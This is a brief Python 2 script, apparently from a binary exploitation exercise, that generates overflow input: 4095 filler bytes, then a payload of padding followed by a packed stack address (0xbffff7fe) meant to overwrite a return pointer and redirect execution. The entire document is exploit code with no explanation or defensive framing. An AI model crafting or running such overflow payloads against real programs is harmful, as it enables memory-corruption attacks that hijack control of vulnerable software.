import struct

print "A" * 4095

payload = "B" * (19 - 4 - 1)
payload += struct.pack("I", 0xbffff7fe)
payload += "C"
print payload